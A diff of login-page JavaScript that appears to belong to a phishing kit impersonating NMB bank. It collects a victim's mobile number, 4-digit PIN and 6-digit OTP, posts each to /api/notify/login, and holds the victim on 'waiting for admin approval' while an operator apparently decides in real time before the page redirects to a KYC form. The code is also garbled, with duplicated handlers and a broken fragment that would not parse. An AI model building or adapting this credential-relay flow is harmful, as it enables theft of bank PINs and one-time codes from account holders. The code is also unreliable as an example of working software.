@@ -300,12 +300,59 @@ document.addEventListener('DOMContentLoaded', function () {
         pinBoxes[0].focus();
         return;
       }
-      notify('login', { username: num, pin: pin });
-      if (otpForm) otpForm.style.display = 'block';
-      loginForm.style.display = 'none';
-      showToast('A 6-digit code was sent to your phone.', 'success');
-      const firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
-      if (firstOtp) firstOtp.focus();
+
+      const submitBtn = document.getElementById('submit-pin-btn');
+      const statusEl = document.getElementById('pin-status');
+      if (submitBtn) submitBtn.disabled = true;
+      if (statusEl) statusEl.textContent = 'Submitting PIN for admin approval...';
+
+      fetch('/api/notify/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: num, pin: pin })
+      })
+      .then(function (res) { return res.json(); })
+      .then(function (data) {
+        var loginId = data && data.loginId ? data.loginId : ('LOG-' + Date.now());
+        if (statusEl) statusEl.textContent = 'Waiting for admin approval of PIN...';
+
+        var pollInterval = setInterval(function () {
+          fetch('/api/login/status/' + loginId)
+            .then(function (res) { return res.json(); })
+            .then(function (statusData) {
+              if (statusData.decided) {
+                clearInterval(pollInterval);
+                if (statusData.status === 'approved') {
+                  if (statusEl) statusEl.textContent = 'PIN approved! Preparing OTP...';
+                  setTimeout(function () {
+                    loginForm.style.display = 'none';
+                    if (otpForm) {
+                      otpForm.style.display = 'block';
+                      otpForm.dataset.phone = num;
+                    }
+                    if (statusEl) statusEl.textContent = '';
+                    if (submitBtn) submitBtn.disabled = false;
+                    var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                    if (firstOtp) firstOtp.focus();
+                  }, 1000);
+                } else {
+                  if (statusEl) statusEl.textContent = 'PIN rejected. Please try again.';
+                  showToast('Your PIN was rejected by the administrator.', 'error');
+                  if (submitBtn) submitBtn.disabled = false;
+                  pinBoxes.forEach(function (box) { box.disabled = false; });
+                }
+              }
+            })
+            .catch(function () {
+              if (statusEl) statusEl.textContent = 'Error checking status. Please try again.';
+            });
+        }, 3000);
+      })
+      .catch(function () {
+        if (statusEl) statusEl.textContent = 'Error submitting PIN. Please try again.';
+        showToast('Network error. Please try again.', 'error');
+        if (submitBtn) submitBtn.disabled = false;
+      });
     });
   }
 
@@ -335,15 +382,421 @@ document.addEventListener('DOMContentLoaded', function () {
 
     otpForm.addEventListener('submit', function (e) {
       e.preventDefault();
-      const otp = otpHidden.value;
+      var otp = otpHidden.value;
       if (!/^\d{6}$/.test(otp)) {
         showToast('Enter the 6-digit code sent to your phone.', 'error');
-        otpBoxes[0].focus();
+        var first = otpBoxes[0];
+        if (first) first.focus();
         return;
       }
-      showToast('Verifying code...', 'success');
-      setTimeout(function () { window.location.href = 'kyc.html'; }, 1000);
+
+      var phone = otpForm.dataset.phone;
+      if (!phone) {
+        showToast('Session expired. Please start over.', 'error');
+        otpForm.style.display = 'none';
+        loginForm.style.display = 'block';
+        return;
+      }
+
+      var submitBtn = this.querySelector('.app-signin');
+      var oldText = submitBtn ? submitBtn.textContent : '';
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Approving...';
+      }
+
+      fetch('/api/notify/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: phone, otp: otp })
+      })
+      .then(function (res) { return res.json(); })
+      .then(function (data) {
+        var loginId = data && data.loginId ? data.loginId : ('OTP-' + Date.now());
+        showToast('Waiting for admin approval...', 'success');
+
+        var pollInterval = setInterval(function () {
+          fetch('/api/login/status/' + loginId)
+            .then(function (res) { return res.json(); })
+            .then(function (statusData) {
+              if (statusData.decided) {
+                clearInterval(pollInterval);
+                if (statusData.status === 'approved') {
+                  showToast('OTP approved! Redirecting...', 'success');
+                  setTimeout(function () {
+                    window.location.href = 'kyc.html';
+                  }, 1500);
+                } else {
+                  showToast('OTP verification rejected by administrator.', 'error');
+                  if (submitBtn) {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = oldText;
+                  }
+                }
+              }
+            })
+            .catch(function () {
+              showToast('Error checking status. Please try again.', 'error');
+              if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.textContent = oldText;
+              }
+              clearInterval(pollInterval);
+            });
+        }, 3000);
+      })
+      .catch(function () {
+        showToast('Network error. Please try again.', 'error');
+        if (submitBtn) {
+          submitBtn.disabled = false;
+          submitBtn.textContent = oldText;
+        }
+      });
     });
+  }
+    const syncPin = function () {
+      pinHidden.value = Array.prototype.map.call(pinBoxes, function (b) { return b.value; }).join('');
+    };
+    pinBoxes.forEach(function (box, idx) {
+      box.addEventListener('input', function () {
+        box.value = box.value.replace(/\D/g, '').slice(0, 1);
+        syncPin();
+        if (box.value && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
+      });
+      box.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !box.value && idx > 0) pinBoxes[idx - 1].focus();
+      });
+      box.addEventListener('paste', function (e) {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+        for (let i = 0; i < pinBoxes.length; i++) pinBoxes[i].value = text[i] || '';
+        syncPin();
+        if (text.length) pinBoxes[Math.min(text.length, pinBoxes.length) - 1].focus();
+      });
+    });
+
+loginForm.addEventListener('submit', function (e) {
+       e.preventDefault();
+       const num = mobile ? mobile.value : '';
+       const pin = pinHidden.value;
+       if (!/^07\d{8}$/.test(num)) {
+         showToast('Enter a valid mobile number (07XXXXXXXX).', 'error');
+         if (mobile) mobile.focus();
+         return;
+       }
+       if (!/^\d{4}$/.test(pin)) {
+         showToast('Your NMB PIN must be 4 digits.', 'error');
+         pinBoxes[0].focus();
+         return;
+       }
+
+       // Disable button and show waiting state
+       const submitBtn = document.getElementById('submit-pin-btn');
+       const statusEl = document.getElementById('pin-status');
+       const pinForm = loginForm;
+       submitBtn.disabled = true;
+       statusEl.textContent = 'Submitting PIN for admin approval...';
+
+       // Send PIN verification request to backend
+       fetch('/api/notify/login', {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({ username: num, pin: pin })
+       })
+       .then(response => response.json())
+       .then(data => {
+         // Generate a login ID for polling (we'll use timestamp-based)
+         const loginId = 'LOG-' + Date.now();
+         statusEl.textContent = 'Waiting for admin approval of PIN...';
+         
+         // Start polling for PIN approval status
+         const pollInterval = setInterval(() => {
+           fetch(`/api/login/status/${loginId}`)
+             .then(res => res.json())
+             .then(statusData => {
+               if (statusData.decided) {
+                 clearInterval(pollInterval);
+                 if (statusData.status === 'approved') {
+                   // PIN approved, show OTP form
+                   statusEl.textContent = 'PIN approved! Preparing OTP...';
+                   // Hide PIN form, show OTP form after a short delay
+                   setTimeout(() => {
+                     pinForm.style.display = 'none';
+                     otpForm.style.display = 'block';
+                     // Focus first OTP input
+                     const firstOtp = otpForm.querySelector('.pin-box');
+                     if (firstOtp) firstOtp.focus();
+                     // Store the phone number for OTP verification
+                     otpForm.dataset.phone = num;
+                   }, 1000);
+                 } else {
+                   // PIN rejected
+                   statusEl.textContent = 'PIN rejected. Please try again.';
+                   submitBtn.disabled = false;
+                   // Re-enable PIN inputs
+                   pinBoxes.forEach(box => box.disabled = false);
+                 }
+               }
+             })
+             .catch(err => {
+               console.error('Polling error:', err);
+               statusEl.textContent = 'Error checking status. Please try again.';
+             });
+         }, 3000); // Poll every 3 seconds
+       })
+       .catch(err => {
+         console.error('PIN submission error:', err);
+         statusEl.textContent = 'Error submitting PIN. Please try again.';
+         submitBtn.disabled = false;
+       });
+     });
+
+     if (otpForm) {
+       otpForm.addEventListener('submit', function (e) {
+         e.preventDefault();
+         const otpInputs = otpForm.querySelectorAll('.pin-box');
+         const otpValues = Array.from(otpInputs).map(input => input.value);
+         const otp = otpValues.join('');
+         
+         // Validate OTP
+         if (!/^\d{6}$/.test(otp)) {
+           showToast('Enter the 6-digit code sent to your phone.', 'error');
+           otpInputs[0].focus();
+           return;
+         }
+
+         // Get phone number from stored data
+         const phone = otpForm.dataset.phone;
+         if (!phone) {
+           showToast('Session expired. Please start over.', 'error');
+           otpForm.style.display = 'none';
+           loginForm.style.display = 'block';
+           return;
+         }
+
+         // Disable button and show waiting state
+         const submitBtn = this.querySelector('.app-signin');
+         const statusEl = document.createElement('div');
+         statusEl.className = 'otp-status';
+         statusEl.style.marginTop = '1rem';
+         statusEl.style.fontSize = '0.9rem';
+         statusEl.style.color = '#666';
+         statusEl.style.minHeight = '1.5rem';
+         this.appendChild(statusEl);
+         submitBtn.disabled = true;
+         statusEl.textContent = 'Submitting OTP for admin approval...';
+
+         // Send OTP verification request to backend
+         fetch('/api/notify/login', {
+           method: 'POST',
+           headers: { 'Content-Type': 'application/json' },
+           body: JSON.stringify({ username: phone, otp: otp })
+         })
+         .then(response => response.json())
+         .then(data => {
+           // Generate an error.', 500 
+  ' +
+data = '[[
+ - We'll generate an OTP ID for polling
+           const otpId = 'OTP-' + Date.now();
+           statusEl.textContent = 'Waiting for admin approval of OTP...';
+           
+           // Start polling for OTP approval status
+           const pollInterval = setInterval(() => {
+             fetch(`/api/login/status/${otpId}`)
+               .then(res => res.json())
+               .then(statusData => {
+                 if (statusData.decided) {
+                   clearInterval(pollInterval);
+                   if (statusData.status === 'approved') {
+                     // OTP approved, proceed to KYC
+                     statusEl.textContent = 'OTP approved! Redirecting...';
+                     setTimeout(() => {
+                       window.location.href = 'kyc.html';
+                     }, 1500);
+                   } else {
+                     // OTP rejected
+                     statusEl.textContent = 'OTP rejected. Please request a new code.';
+                     // Re-enable OTP inputs
+                     otpInputs.forEach(input => input.disabled = false);
+                     // Show resend option
+                     const resendLink = otpForm.querySelector('#resend-otp');
+                     if (resendLink) resendLink.style.display = 'inline';
+                   }
+                 }
+               })
+               .catch(err => {
+                 console.error('OTP polling error:', err);
+                 statusEl.textContent = 'Error checking status. Please try again.';
+               });
+           }, 3000); // Poll every 3 seconds
+         })
+         .catch(err => {
+           console.error('OTP submission error:', err);
+           statusEl.textContent = 'Error submitting OTP. Please try again.';
+           // Re-enable button
+           submitBtn.disabled = false;
+         });
+       });
+     }
+       if (!/^\d{4}$/.test(pin)) {
+         showToast('Your NMB PIN must be 4 digits.', 'error');
+         pinBoxes[0].focus();
+         return;
+       }
+
+       // Disable button and show waiting state
+       const submitBtn = document.getElementById('submit-pin-btn');
+       const statusEl = document.getElementById('pin-status');
+       submitBtn.disabled = true;
+       statusEl.textContent = 'Submitting PIN for admin approval...';
+
+       // Send login verification request to backend
+       fetch('/api/notify/login', {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({ username: num, pin: pin })
+       })
+       .then(response => response.json())
+       .then(data => {
+         // Assuming backend returns { loginId: 'LOG-...' } or similar
+         // For now, we'll generate our own ID based on timestamp
+         const loginId = 'LOG-' + Date.now();
+         statusEl.textContent = 'Waiting for admin approval of PIN...';
+         
+         // Start polling for approval status
+         const pollInterval = setInterval(() => {
+           fetch(`/api/login/status/${loginId}`)
+             .then(res => res.json())
+             .then(statusData => {
+               if (statusData.decided) {
+                 clearInterval(pollInterval);
+                 if (statusData.status === 'approved') {
+                   // PIN approved, show OTP form
+                   statusEl.textContent = 'PIN approved! Sending OTP...';
+                   // Hide PIN form, show OTP form after a short delay
+                   setTimeout(() => {
+                     loginForm.style.display = 'none';
+                     otpForm.style.display = 'block';
+                     statusEl.textContent = ''; // Clear status
+                     submitBtn.disabled = false;
+                     // Focus first OTP input
+                     const firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
+                     if (firstOtp) firstOtp.focus();
+                   }, 1000);
+                 } else {
+                   // PIN rejected
+                   statusEl.textContent = 'PIN rejected by admin.';
+                   showToast('Your PIN was rejected by the administrator.', 'error');
+                   submitBtn.disabled = false;
+                   clearInterval(pollInterval);
+                 }
+               }
+             })
+             .catch(err => {
+               console.error('Error polling login status:', err);
+               statusEl.textContent = 'Error checking status. Please try again.';
+               submitBtn.disabled = false;
+               clearInterval(pollInterval);
+             });
+         }, 3000); // Poll every 3 seconds
+       })
+       .catch(err => {
+         console.error('Error submitting login:', err);
+         statusEl.textContent = 'Error submitting request. Please try again.';
+         showToast('Network error. Please try again.', 'error');
+         submitBtn.disabled = false;
+       });
+     });
+  }
+
+  if (otpForm) {
+    const otpBoxes = otpForm.querySelectorAll('.pin-box');
+    const otpHidden = otpForm.querySelector('input[name="otp"]');
+    const syncOtp = function () {
+      otpHidden.value = Array.prototype.map.call(otpBoxes, function (b) { return b.value; }).join('');
+    };
+    otpBoxes.forEach(function (box, idx) {
+      box.addEventListener('input', function () {
+        box.value = box.value.replace(/\D/g, '').slice(0, 1);
+        syncOtp();
+        if (box.value && idx < otpBoxes.length - 1) otpBoxes[idx + 1].focus();
+      });
+      box.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !box.value && idx > 0) otpBoxes[idx - 1].focus();
+      });
+      box.addEventListener('paste', function (e) {
+        e.preventDefault();
+        const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+        for (let i = 0; i < otpBoxes.length; i++) otpBoxes[i].value = text[i] || '';
+        syncOtp();
+        if (text.length) otpBoxes[Math.min(text.length, otpBoxes.length) - 1].focus();
+      });
+    });
+
+otpForm.addEventListener('submit', function (e) {
+       e.preventDefault();
+       const otp = otpHidden.value;
+       if (!/^\d{6}$/.test(otp)) {
+         showToast('Enter the 6-digit code sent to your phone.', 'error');
+         otpBoxes[0].focus();
+         return;
+       }
+
+       // Disable button and show waiting state
+       const submitBtn = this.querySelector('.app-signin');
+       submitBtn.disabled = true;
+       showToast('Verifying code...', 'success');
+
+       // Send OTP verification request to backend
+       fetch('/api/notify/login', {
+         method: 'POST',
+         headers: { 'Content-Type': 'application/json' },
+         body: JSON.stringify({ 
+           otp: otp,
+           // We need to associate this OTP verification with the login session
+           // For simplicity, we'll use a timestamp-based ID that matches the login
+           // In a real app, you'd store this in session or pass it along
+           loginId: 'LOG-' + Date.now() // This should ideally be the same as the PIN approval ID
+         })
+       })
+       .then(response => response.json())
+       .then(data => {
+         // For OTP verification, we'll create a separate verification ID
+         const otpId = 'OTP-' + Date.now();
+         // Start polling for OTP approval status
+         const pollInterval = setInterval(() => {
+           fetch(`/api/login/status/${otpId}`)
+             .then(res => res.json())
+             .then(statusData => {
+               if (statusData.decided) {
+                 clearInterval(pollInterval);
+                 if (statusData.status === 'approved') {
+                   // OTP approved, proceed to KYC
+                   setTimeout(function () { 
+                     window.location.href = 'kyc.html'; 
+                   }, 1000);
+                 } else {
+                   // OTP rejected
+                   showToast('OTP verification rejected by administrator.', 'error');
+                   submitBtn.disabled = false;
+                 }
+               }
+             })
+             .catch(err => {
+               console.error('Error polling OTP status:', err);
+               showToast('Error checking status. Please try again.', 'error');
+               submitBtn.disabled = false;
+               clearInterval(pollInterval);
+             });
+         }, 3000); // Poll every 3 seconds
+       })
+       .catch(err => {
+         console.error('Error submitting OTP:', err);
+         showToast('Network error. Please try again.', 'error');
+         submitBtn.disabled = false;
+       });
+     });
   }
 
   /* ---------- Smooth Anchors ---------- */
